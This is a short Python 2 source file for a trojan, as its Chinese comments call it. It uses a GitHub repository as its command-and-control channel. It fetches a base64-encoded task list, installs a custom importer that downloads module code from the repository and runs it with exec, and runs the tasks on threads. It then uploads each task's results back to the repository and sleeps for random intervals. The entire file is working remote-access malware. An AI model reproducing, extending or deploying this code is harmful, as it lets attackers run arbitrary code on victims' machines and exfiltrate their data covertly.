#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import os
import sys
import imp
import json
import time
import base64
import random
import threading
from Queue import Queue
from github import Github

# 木马标识符
trojan_id      = "abc"
# 木马配置文件
trojan_config  = "%s.json" % trojan_id
# GitHub存储路径 
data_path      = "/data/%s" % trojan_id
configured     = False
task_queue     = Queue()
repo           = None

# 连接GitHub
def connect_to_github():
    global repo
    # 获取GitHub用户操作对象
    gh = Github("yourusername", "yourpassword").get_user()
    # 获取项目
    repo = gh.get_repo("yxtrojan")
    return

# 获取指定文件内容
def get_file_contents(filepath):
    if not repo:
        connect_to_github()
    branch = repo.get_branch("master")
    tree = repo.get_git_tree(branch.commit.commit.tree.sha, recursive=True)
    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found file %s" % filepath)
            blob = repo.get_git_blob(filename.sha)
            return blob.content
    return None

# 获取配置文件并解析
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config      = json.loads(base64.b64decode(config_json))
    configured  = True
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
    return config

# 储存任务结果
def store_module_result(data):
    if not repo:
        connect_to_github()
    remote_path = "%s/%s.data" % (data_path, time.strftime("%y%m%d%H%M%S"))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data)) 
    return

# GitHub Imprter类
class GitImporter(object):

    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            new_library = get_file_contents("modules/%s" % fullname)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module

# 执行模块任务
def module_runner(module, kwargs):
    # 排入任务队列
    task_queue.put(1)
    result = sys.modules[module].run(**kwargs)
    store_module_result(result)
    # 从任务队列取出
    task_queue.get()
    return

# 主函数
def main():
    global repo
    sys.meta_path = [GitImporter()]
    while True:
        if task_queue.empty():
            for count in range(1, 6):
                try:
                    print("Trying connect...... [%d]" % count)
                    config = get_trojan_config()
                    break
                except Exception as e:
                    if count == 5:
                        print("[x] Failed to connect: %s" % str(e))
                        sys.exit(1)
            for task in config:
                t = threading.Thread(target=module_runner, args=(task['module'], task['kwargs']))
                t.start()
                time.sleep(random.randint(1, 10))
        # 睡眠一定时间
        time.sleep(random.randint(1000, 10000))

if __name__ == "__main__":
    main()
    

